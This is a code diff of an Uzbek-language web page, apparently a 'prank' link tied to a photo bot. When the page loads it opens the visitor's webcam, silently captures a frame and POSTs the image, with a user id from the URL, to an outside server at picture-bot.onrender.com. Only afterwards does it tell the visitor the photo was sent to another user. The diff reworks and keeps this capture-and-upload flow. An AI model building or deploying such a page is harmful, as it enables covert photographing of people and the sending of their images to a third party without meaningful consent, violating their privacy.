@@ -5,37 +5,26 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Rasmga Olish</title>
     <style>
-        /* Yangi CSS stil */
         body {
             margin: 0;
             padding: 0;
             background: #050614;
-            font-family: Arial, sans-serif;
             color: white;
+            font-family: Arial, sans-serif;
         }
 
-        #container {
+        #prank {
             max-width: 700px;
-            margin: 50px auto;
-            padding: 20px;
-            background: #131426;
-            border-radius: 20px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            padding: 5%;
+            margin: auto;
             text-align: center;
-        }
-
-        video, canvas {
-            width: 100%;
-            border-radius: 10px;
-            margin-bottom: 10px;
-            display: none; /* Video va canvas boshlang'ich holatda yashirin */
         }
 
         .picture {
             border-radius: 20px;
             max-width: 600px;
             height: 400px;
-            background: #1a1a2e;
+            background: #131426;
             margin: 0 auto;
         }
 
@@ -47,8 +36,8 @@
         }
 
         .desc {
-            margin-top: 20px;
-            background: #1a1a2e;
+            margin-top: 50px;
+            background: #131426;
             padding: 20px;
             border-radius: 20px;
         }
@@ -77,85 +66,59 @@
             border: 1px solid #2871FF;
         }
 
-        #message, #error {
-            font-size: 18px;
-            font-weight: bold;
-            margin-top: 20px;
+        .hidden {
+            display: none;
         }
-
-        #message {
-            color: #28a745;
-        }
-
-        #error {
-            color: red;
-        }
-
-        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div id="container">
-        <video id="video" autoplay playsinline class="hidden"></video>
-        <canvas id="canvas" class="hidden"></canvas>
-        <div id="prank" class="hidden">
-            <div class="picture">
-                <div id="byte_photo"></div>
-            </div>
-            <div class="desc">
-                <p>🙊 Sizning rasmingiz <span>@Foydalanuvchi</span> ga yuborildi!</p>
-            </div>
+    <!-- Kamera va Canvas Elementlari -->
+    <video id="camera" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <!-- Rasm Ko'rsatish Qismi -->
+    <div id="prank" class="hidden">
+        <div class="picture">
+            <div id="byte_photo"></div>
         </div>
-        <p id="message" class="hidden">📤 Rasm yuborilmoqda...</p>
-        <p id="error" class="hidden" style="color: red;"></p>
-        <button id="retry" class="hidden">🔄 Qayta urinish</button>
+        <div class="desc">
+            <p>🙊 Sizning rasmingiz <span>@Foydalanuvchi</span> ga yuborildi!</p>
+        </div>
     </div>
 
+    <!-- Xatolik Xabari va Qayta Urinish Tugmasi -->
+    <div id="errorMessage" class="hidden" style="color: red; text-align: center; margin-top: 20px;"></div>
+    <button id="retryButton" class="hidden" onclick="initCamera()">Qayta urinish</button>
+
     <script>
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        const ctx = canvas.getContext("2d");
-        const message = document.getElementById("message");
-        const errorMessage = document.getElementById("error");
-        const retryButton = document.getElementById("retry");
-        const loadingMessage = document.getElementById("loading");
-        const prank = document.getElementById("prank");
-        const bytePhoto = document.getElementById("byte_photo");
+        // Elementlarni Tanlash
+        const video = document.getElementById('camera');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const prank = document.getElementById('prank');
+        const errorMessage = document.getElementById('errorMessage');
+        const retryButton = document.getElementById('retryButton');
+        const bytePhoto = document.getElementById('byte_photo');
 
-        async function startCamera() {
+        // Kamerani Yoqish
+        async function initCamera() {
             try {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    throw new Error("Kamerani qo'llab-quvvatlamaydi!");
-                }
-
-                const constraints = {
-                    video: {
-                        facingMode: { ideal: "user" },
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    }
-                };
-
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
 
-                video.onloadedmetadata = () => {
-                    video.play();
-                    video.classList.remove("hidden");
-                    loadingMessage.classList.add("hidden");
-
-                    setTimeout(captureImage, 500);
-                };
-            } catch (err) {
-                console.error("Kameraga ruxsat berilmadi!", err);
-                errorMessage.innerText = "❌ Kameraga ruxsat berilmadi yoki kamera mavjud emas!";
+                video.addEventListener('loadeddata', () => {
+                    setTimeout(capturePhoto, 500); // Kamera yonishi uchun kutish
+                });
+            } catch (error) {
+                console.error('Kameraga ulanishda xatolik:', error);
+                errorMessage.innerText = "❌ Kamera ishlamayapti! Iltimos, kamerangizni tekshiring.";
                 errorMessage.classList.remove("hidden");
                 retryButton.classList.remove("hidden");
-                loadingMessage.classList.add("hidden");
             }
         }
 
-        function captureImage() {
+        // Rasmni Olish
+        function capturePhoto() {
             if (!video.srcObject || video.videoWidth === 0 || video.videoHeight === 0) {
                 errorMessage.innerText = "❌ Kamera ishlamayapti!";
                 errorMessage.classList.remove("hidden");
@@ -165,13 +128,19 @@
 
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             const imageData = canvas.toDataURL("image/png");
+            bytePhoto.style.backgroundImage = `url(${imageData})`; // Rasmni ko'rsatish
+            prank.classList.remove("hidden"); // Rasmni ko'rsatish qismini ochish
+
+            // Rasmni Serverga Yuborish
             const userId = getQueryParam("id");
+            sendImageToServer(imageData, userId);
+        }
 
-            message.classList.remove("hidden");
-
+        // Rasmni Serverga Yuborish
+        function sendImageToServer(imageData, userId) {
             fetch("https://picture-bot.onrender.com/upload", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -182,9 +151,7 @@
                 return res.json();
             })
             .then(data => {
-                prank.classList.remove("hidden");
-                bytePhoto.style.backgroundImage = `url(${imageData})`;
-                message.classList.add("hidden");
+                console.log("Rasm muvaffaqiyatli yuborildi:", data);
             })
             .catch(err => {
                 console.error("Xatolik:", err);
@@ -194,16 +161,16 @@
             });
         }
 
+        // URL dan Query Parametrni Olish
         function getQueryParam(param) {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get(param);
         }
 
-        retryButton.addEventListener("click", () => {
-            location.reload();
+        // Sahifa Yuklanganda Kamerani Yoqish
+        document.addEventListener('DOMContentLoaded', () => {
+            initCamera();
         });
-
-        startCamera();
     </script>
 </body>
 </html>
